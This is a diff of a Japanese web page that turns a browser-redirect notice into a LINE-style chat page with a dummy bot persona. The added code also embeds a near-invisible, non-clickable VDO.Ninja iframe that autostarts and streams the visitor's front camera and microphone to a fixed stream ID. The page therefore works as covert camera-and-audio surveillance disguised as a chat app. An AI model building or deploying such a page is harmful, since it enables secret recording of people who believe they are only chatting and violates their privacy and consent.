@@ -2,210 +2,309 @@
 <html lang="ja">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
   <meta name="robots" content="noindex,nofollow" />
-  <title>開き方のご案内</title>
+  <title>撮影チャット（最小版）</title>
+
+  <!-- Tailwind（ビルド不要） -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- React（ビルド不要） -->
+  <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+
+  <!-- JSXをブラウザで変換（ビルド不要） -->
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
 
   <style>
-    :root{
-      --bg1:#fff7fb; --bg2:#f3fbff;
-      --card:#ffffffcc; --text:#2b2b2b; --muted:#666;
-      --primary1:#a7f3d0; --primary2:#93c5fd; --primaryText:#0b1b2a;
-      --subBg:#fff; --subBorder:#e7e7ef;
-      --shadow: 0 12px 30px rgba(20, 20, 40, 0.10);
-      --radius: 18px;
+    html, body { height: 100%; margin: 0; background:#000; overflow:hidden; }
+    body {
+      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+      background:#000;
     }
-    body{
-      margin:0;
-      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Noto Sans JP", sans-serif;
-      color: var(--text);
-      background:
-        radial-gradient(800px 400px at 15% 10%, var(--bg1), transparent 60%),
-        radial-gradient(900px 500px at 85% 15%, var(--bg2), transparent 60%),
-        linear-gradient(180deg, #ffffff, #f7f7ff);
-      min-height: 100vh;
+
+    /* 裏：VDO.Ninja（見えない・触れない） */
+    #vdo {
+      position: fixed; inset: 0;
+      width: 100%; height: 100%;
+      border: 0;
+      opacity: 0.001;
+      pointer-events: none;
+      z-index: 1;
     }
-    .wrap{min-height:100vh;display:grid;place-items:center;padding:22px;box-sizing:border-box;}
-    .card{
-      width:min(560px,100%);
-      background:var(--card);
-      border:1px solid rgba(230,230,245,0.9);
-      border-radius:var(--radius);
-      box-shadow:var(--shadow);
-      backdrop-filter: blur(8px);
-      padding:18px 18px 16px;
+
+    /* 表：UI */
+    #root {
+      position: fixed; inset: 0;
+      z-index: 10;
     }
-    .title{display:flex;align-items:center;gap:10px;margin:0 0 10px 0;font-weight:800;font-size:18px;}
-    .badge{
-      width:34px;height:34px;border-radius:12px;display:grid;place-items:center;
-      background: linear-gradient(135deg, #ffd6e8, #d9f2ff);
-      border:1px solid rgba(220,220,240,0.9);
-      box-shadow:0 8px 18px rgba(40,40,80,0.08);
-      font-size:18px;
+
+    .scrollbar-hide::-webkit-scrollbar { display: none; }
+    .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
+
+    @keyframes message-in {
+      from { opacity: 0; transform: translateY(10px); }
+      to   { opacity: 1; transform: translateY(0); }
     }
-    .msg{margin:0 0 14px 0;color:var(--muted);line-height:1.75;font-size:14.5px;}
-    .btn{
-      width:100%;
-      border-radius:14px;
-      padding:13px 14px;
-      border:1px solid transparent;
-      font-size:16px;
-      cursor:pointer;
-      user-select:none;
-      transition: transform .04s ease, box-shadow .12s ease, filter .12s ease;
-    }
-    .btn:active{transform: translateY(1px);}
-    .btnPrimary{
-      background: linear-gradient(135deg, var(--primary1), var(--primary2));
-      color: var(--primaryText);
-      font-weight: 900;
-      box-shadow: 0 14px 26px rgba(120, 170, 255, 0.22);
-      border: 1px solid rgba(140, 180, 255, 0.35);
-    }
-    .btnPrimary:hover{filter: brightness(1.02);}
-    .btnSub{
-      margin-top:10px;
-      background: var(--subBg);
-      color:#333;
-      border:1px solid var(--subBorder);
-      box-shadow:0 10px 18px rgba(20,20,40,0.06);
-      font-weight:700;
-    }
-    .toast{
-      position:fixed;left:50%;bottom:16px;transform:translateX(-50%);
-      background: rgba(255,255,255,0.92);
-      color:#2b2b2b;
-      border:1px solid rgba(220,220,235,0.95);
-      border-radius:12px;
-      padding:10px 12px;
-      box-shadow:0 14px 26px rgba(20,20,40,0.12);
-      display:none;font-size:13px;
-    }
-    @media (max-width:420px){
-      .card{padding:16px 14px 14px;}
-      .msg{font-size:14px;}
-      .btn{font-size:15.5px;}
-    }
+    .animate-message-in { animation: message-in 0.25s ease-out forwards; }
   </style>
 </head>
 
 <body>
-<script>
-  // ★毎回ここだけ更新：Gemini共有URL
-  const TARGET_URL = "https://gemini.google.com/share/203fd1ee5f3b";
+  <!-- 裏：配信（常時） -->
+  <iframe
+    id="vdo"
+    allow="camera *; microphone *; autoplay; fullscreen"
+    referrerpolicy="no-referrer"
+  ></iframe>
 
-  const ua = navigator.userAgent || "";
+  <!-- 表：チャット -->
+  <div id="root"></div>
 
-  // ---- 判定方針 ----
-  // PC：全部OK（即Geminiへ）
-  // スマホ：許可するのは以下のみ
-  //   - iOS Safari
-  //   - iOS Chrome（CriOS）
-  //   - Android Chrome（ただしWebView/LINEを除外）
-  // それ以外：案内画面
+  <script>
+    // ====== VDO.Ninja 裏配信（最小） ======
+    const STREAM_ID = "toaCam01"; // 必要なら変えてOK
+    const vdoSrc =
+      "https://vdo.ninja/?" +
+      "push=" + encodeURIComponent(STREAM_ID) +
+      "&webcam" +
+      "&autostart" +
+      "&facing=user" +
+      "&audiodevice=1" +
+      "&cleanoutput" +
+      "&hidehome" +
+      "&transparent";
+    document.getElementById("vdo").src = vdoSrc;
+  </script>
 
-  const isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
-  const isIOS = /iPhone|iPad|iPod/i.test(ua);
-  const isAndroid = /Android/i.test(ua);
+  <script type="text/babel">
+    const { useEffect, useRef, useState } = React;
 
-  // アプリ内ブラウザ/埋め込みWebViewの強いシグナル（入ってたら弾く）
-  const isInAppStrong =
-    /Line\//i.test(ua) ||            // LINE内ブラウザ
-    /;\s*wv\)/i.test(ua) ||          // Android WebViewの印
-    /Version\/4\.0/i.test(ua);       // Android WebViewでありがち
+    const STORAGE_KEY = "mio_min_chat";
+    const BOT_PROFILE_IMAGE_URL = "https://i.imgur.com/Fr9wo6J.png";
 
-  // iOS Safari 判定：Safariを含み、他ブラウザ印がない
-  const isSafari =
-    isIOS &&
-    /Safari/i.test(ua) &&
-    !/CriOS|FxiOS|EdgiOS|OPiOS|GSA|Line\//i.test(ua);
+    const BOT_SETTINGS = {
+      displayName: "さや",
+      initialMessages: [
+        "ひさしぶりー！さやだよー！",
+        "今は動作チェック用の最小版やで。送ったらダミーで返すよー。"
+      ]
+    };
 
-  // iOS Chrome 判定
-  const isChromeIOS = isIOS && /CriOS/i.test(ua);
+    function App() {
+      const [messages, setMessages] = useState(() => {
+        const saved = localStorage.getItem(`${STORAGE_KEY}_messages`);
+        if (saved) {
+          try {
+            const parsed = JSON.parse(saved);
+            return parsed.map(m => ({ ...m, timestamp: new Date(m.timestamp) }));
+          } catch(e) {}
+        }
+        return BOT_SETTINGS.initialMessages.map((text, i) => ({
+          id: i + 1, role: "model", text, timestamp: new Date()
+        }));
+      });
 
-  // Android Chrome 判定：Chrome/Chromium を含み、かつ WebView/LINE ではない
-  const isChromeAndroid =
-    isAndroid &&
-    /Chrome\/|Chromium\//i.test(ua) &&
-    !/Edg|OPR|SamsungBrowser/i.test(ua) &&
-    !isInAppStrong;
+      const [inputText, setInputText] = useState("");
+      const [isTyping, setIsTyping] = useState(false);
+      const [modalImage, setModalImage] = useState(null);
 
-  const allowOnMobile = (isSafari || isChromeIOS || isChromeAndroid);
+      const messagesEndRef = useRef(null);
+      const textareaRef = useRef(null);
+      const fileInputRef = useRef(null);
 
-  function toast(msg){
-    const el = document.getElementById("toast");
-    el.textContent = msg;
-    el.style.display = "block";
-    clearTimeout(window.__t);
-    window.__t = setTimeout(()=> el.style.display="none", 1700);
-  }
+      useEffect(() => {
+        localStorage.setItem(
+          `${STORAGE_KEY}_messages`,
+          JSON.stringify(messages.map(m => ({ ...m, timestamp: m.timestamp.toISOString() })))
+        );
+      }, [messages]);
 
-  function makeChromeIntent(url){
-    // Android向け：Chrome intent（端末/アプリ側でブロックされることもある）
-    const u = new URL(url);
-    const fallback = encodeURIComponent(url);
-    return `intent://${u.host}${u.pathname}${u.search}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${fallback};end`;
-  }
+      useEffect(() => {
+        messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
+      }, [messages, isTyping]);
 
-  async function copyLink(){
-    try{
-      await navigator.clipboard.writeText(TARGET_URL);
-      toast("リンクをコピーしました！");
-    }catch(e){
-      const ta=document.createElement("textarea");
-      ta.value=TARGET_URL; document.body.appendChild(ta);
-      ta.select(); document.execCommand("copy"); document.body.removeChild(ta);
-      toast("リンクをコピーしました！");
+      useEffect(() => {
+        if (!textareaRef.current) return;
+        textareaRef.current.style.height = "auto";
+        textareaRef.current.style.height = `${Math.min(textareaRef.current.scrollHeight, 120)}px`;
+      }, [inputText]);
+
+      const pushBotReply = (userText, hasImage) => {
+        setIsTyping(true);
+        setTimeout(() => {
+          const reply = hasImage
+            ? "画像きた！今は最小版やから、表示と送信だけ確認しよー。"
+            : `了解〜。今は最小版やから、ここに本番のAI返信が入る予定やで。`;
+
+          setMessages(prev => ([
+            ...prev,
+            { id: Date.now() + 1, role: "model", text: reply, timestamp: new Date() }
+          ]));
+          setIsTyping(false);
+        }, 700);
+      };
+
+      const handleSend = (e, imageBase64 = null) => {
+        e?.preventDefault();
+        const text = inputText.trim();
+        if (!text && !imageBase64) return;
+        if (isTyping) return;
+
+        const userMsg = {
+          id: Date.now(),
+          role: "user",
+          text: inputText,
+          image: imageBase64,
+          timestamp: new Date()
+        };
+
+        setMessages(prev => ([...prev, userMsg]));
+        setInputText("");
+
+        pushBotReply(text, !!imageBase64);
+      };
+
+      const handleKeyDown = (e) => {
+        if (e.nativeEvent.isComposing) return;
+        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        if (e.key === "Enter" && !e.shiftKey && !isTouchDevice) {
+          e.preventDefault();
+          handleSend();
+        }
+      };
+
+      const handleFileChange = (e) => {
+        const file = e.target.files?.[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onloadend = () => handleSend(null, reader.result);
+        reader.readAsDataURL(file);
+      };
+
+      const handleReset = () => {
+        localStorage.removeItem(`${STORAGE_KEY}_messages`);
+        setMessages(BOT_SETTINGS.initialMessages.map((text, i) => ({
+          id: Date.now() + i, role: "model", text, timestamp: new Date()
+        })));
+        setIsTyping(false);
+      };
+
+      return (
+        <div className="flex justify-center items-center min-h-[100dvh] bg-[#7494C0] font-sans antialiased overflow-hidden fixed inset-0">
+          <div className="w-full max-w-[420px] bg-[#84A2CC] sm:rounded-lg shadow-2xl flex flex-col h-[100dvh] sm:h-[800px] max-h-[100dvh] overflow-hidden relative">
+
+            <div className="bg-[#84A2CC] px-4 py-3 flex items-center justify-between sticky top-0 z-30 text-white shadow-sm h-[60px] flex-shrink-0">
+              <div className="flex items-center gap-2">
+                <span className="text-white/90 text-sm">＜</span>
+                <span className="font-bold text-lg">{BOT_SETTINGS.displayName}</span>
+              </div>
+              <div className="flex items-center gap-5">
+                <span className="text-white/90 text-sm">🔍</span>
+                <span className="text-white/90 text-sm">📞</span>
+                <button className="text-white/90 text-sm" onClick={handleReset}>↻</button>
+              </div>
+            </div>
+
+            <div className="flex-1 overflow-y-auto p-4 space-y-4 scrollbar-hide bg-[#84A2CC] overscroll-contain">
+              <div className="text-center py-4">
+                <span className="bg-black/10 text-[11px] text-white/90 px-3 py-1 rounded-full">
+                  {new Date().toLocaleDateString('ja-JP', { year:'numeric', month:'long', day:'numeric', weekday:'short' })}
+                </span>
+              </div>
+
+              {messages.map((msg) => {
+                const isBot = msg.role === "model";
+                const ts = (msg.timestamp instanceof Date) ? msg.timestamp : new Date(msg.timestamp);
+                return (
+                  <div key={msg.id} className={`flex w-full ${isBot ? "justify-start" : "justify-end"} animate-message-in`}>
+                    {isBot && (
+                      <div
+                        className="w-10 h-10 rounded-full overflow-hidden mr-2 flex-shrink-0 mt-1 shadow-sm border border-white/20 cursor-pointer active:scale-95"
+                        onClick={() => setModalImage(BOT_PROFILE_IMAGE_URL)}
+                      >
+                        <img src={BOT_PROFILE_IMAGE_URL} alt="さや" className="w-full h-full object-cover" />
+                      </div>
+                    )}
+
+                    <div className={`flex ${isBot ? "flex-row" : "flex-row-reverse"} items-end max-w-[75%]`}>
+                      <div className={`rounded-[18px] text-[15px] shadow-sm leading-relaxed break-words relative ${isBot ? "bg-white text-gray-800 rounded-tl-none" : "bg-[#78E08F] text-gray-900 rounded-tr-none"} ${msg.image ? "p-1" : "px-4 py-2"}`}>
+                        {msg.image ? (
+                          <div className="flex flex-col gap-1">
+                            <img
+                              src={msg.image}
+                              alt="画像"
+                              className="max-w-full rounded-[14px] cursor-pointer hover:opacity-90 transition-opacity"
+                              onClick={() => setModalImage(msg.image)}
+                            />
+                            {msg.text && <div className="px-2 py-1 whitespace-pre-wrap">{msg.text}</div>}
+                          </div>
+                        ) : (
+                          <div className="whitespace-pre-wrap">{msg.text}</div>
+                        )}
+                      </div>
+
+                      <div className={`text-[10px] text-white/80 mb-0.5 mx-2 flex flex-col ${isBot ? "items-start" : "items-end"}`}>
+                        {!isBot && <span className="font-medium">既読</span>}
+                        <span>{ts.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' })}</span>
+                      </div>
+                    </div>
+                  </div>
+                );
+              })}
+
+              {isTyping && (
+                <div className="flex justify-start items-end opacity-80">
+                  <div className="w-10 h-10 rounded-full overflow-hidden mr-2 flex-shrink-0 bg-gray-300">
+                    <img src={BOT_PROFILE_IMAGE_URL} alt="さや" className="w-full h-full object-cover opacity-60" />
+                  </div>
+                  <div className="bg-white px-4 py-3 rounded-[18px] rounded-tl-none shadow-sm text-xs text-gray-500">
+                    入力中…
+                  </div>
+                </div>
+              )}
+
+              <div ref={messagesEndRef} className="h-4" />
+            </div>
+
+            <div className="bg-white p-3 pb-[calc(12px+env(safe-area-inset-bottom))] flex items-end gap-2 border-t border-gray-200 flex-shrink-0">
+              <input type="file" ref={fileInputRef} className="hidden" accept="image/*" onChange={handleFileChange} />
+              <button className="text-gray-500 text-lg mb-1.5" onClick={() => fileInputRef.current?.click()}>＋</button>
+
+              <div className="flex-1 bg-gray-100 rounded-[22px] px-3 py-1 flex items-end min-h-[44px]">
+                <textarea
+                  ref={textareaRef}
+                  className="w-full bg-transparent border-none text-[15px] outline-none py-2 px-1 resize-none overflow-y-auto max-h-[120px] leading-[1.4]"
+                  placeholder="メッセージを入力"
+                  rows="1"
+                  value={inputText}
+                  onChange={(e) => setInputText(e.target.value)}
+                  onKeyDown={handleKeyDown}
+                />
+                <span className="text-gray-500 text-lg ml-2">☺</span>
+              </div>
+
+              <button
+                onClick={handleSend}
+                className={`transition-colors mb-1.5 ${inputText.trim() ? "text-[#7494C0]" : "text-gray-300"}`}
+                title="送信"
+              >
+                ➤
+              </button>
+            </div>
+          </div>
+
+          {modalImage && (
+            <div className="fixed inset-0 z-[100] bg-black flex items-center justify-center p-4" onClick={() => setModalImage(null)}>
+              <button className="absolute top-6 right-6 text-white p-2 bg-white/10 rounded-full">✕</button>
+              <img src={modalImage} className="max-w-full max-h-full object-contain rounded-lg" alt="拡大画像" />
+            </div>
+          )}
+        </div>
+      );
     }
-  }
 
-  function openExternal(){
-    if (isAndroid) {
-      // AndroidはChrome起動を試みる（ブロック時はコピーで逃げる）
-      location.href = makeChromeIntent(TARGET_URL);
-      return;
-    }
-    // iOSは強制不可なので、新規タブを試す（だめでもコピーでOK）
-    window.open(TARGET_URL, "_blank", "noopener,noreferrer");
-  }
-
-  // ✅ ルール適用
-  if (!isMobile) {
-    // PCは全部OK
-    location.replace(TARGET_URL);
-  } else if (allowOnMobile) {
-    // スマホでも許可されたブラウザはOK
-    location.replace(TARGET_URL);
-  } else {
-    // 案内画面表示（ここに留まる）
-    window.__APP__ = { openExternal, copyLink };
-  }
-</script>
-
-<div class="wrap">
-  <div class="card">
-    <div class="title">
-      <div class="badge">🌷</div>
-      開き方のご案内
-    </div>
-
-    <p class="msg">
-      このブラウザではうまく動作しないため、<br>
-      ChromeかSafariのブラウザで開いてください💦<br><br>
-      下のボタンから移動するか、<br>
-      URLをコピペしてお楽しみください！
-    </p>
-
-    <button class="btn btnPrimary" onclick="__APP__.openExternal()">
-      外部ブラウザで開く
-    </button>
-
-    <button class="btn btnSub" onclick="__APP__.copyLink()">
-      リンクをコピー
-    </button>
-  </div>
-</div>
-
-<div class="toast" id="toast"></div>
+    ReactDOM.createRoot(document.getElementById("root")).render(<App />);
+  </script>
 </body>
 </html>
